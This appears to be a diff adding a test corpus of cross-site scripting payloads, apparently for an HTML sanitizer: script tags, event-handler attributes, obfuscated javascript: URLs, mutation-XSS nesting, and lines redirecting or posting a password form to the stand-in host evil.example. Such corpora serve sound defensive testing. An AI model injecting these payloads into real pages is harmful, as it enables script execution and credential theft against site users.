@@ -1,0 +1,37 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<img src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="  javascript:alert(1)">click</a>
+<a href="jav&#x09;ascript:alert(1)">click</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+<a href="vbscript:msgbox(1)">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<svg onload=alert(1)><circle r=10></circle></svg>
+<svg><script>alert(1)</script></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<iframe src="https://evil.example"></iframe>
+<object data="evil.swf"></object>
+<embed src="evil.swf">
+<body onload=alert(1)>
+<div style="background:url(javascript:alert(1))">x</div>
+<style>body{background:red}</style>
+<link rel=stylesheet href="https://evil.example/x.css">
+<meta http-equiv="refresh" content="0;url=https://evil.example">
+<form action="https://evil.example"><input name=password></form>
+<button formaction="javascript:alert(1)">x</button>
+<details open ontoggle=alert(1)>x</details>
+<p onclick="alert(1)">x</p>
+<base href="https://evil.example/">
+<a href="https://ok.example" onmouseover="alert(1)">x</a>
+<img src="x" srcset="javascript:alert(1) 1x">
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+<textarea><script>alert(1)</script></textarea>
+<scr<script>ipt>alert(1)</script>
+<<script>script>alert(1)<</script>/script>
+<!--<img src=x onerror=alert(1)>-->
+<![CDATA[<script>alert(1)</script>]]>
+<video><source onerror="alert(1)"></video>
+<a href="//evil.example" target="_top">x</a>
+<blockquote cite="javascript:alert(1)">x</blockquote>
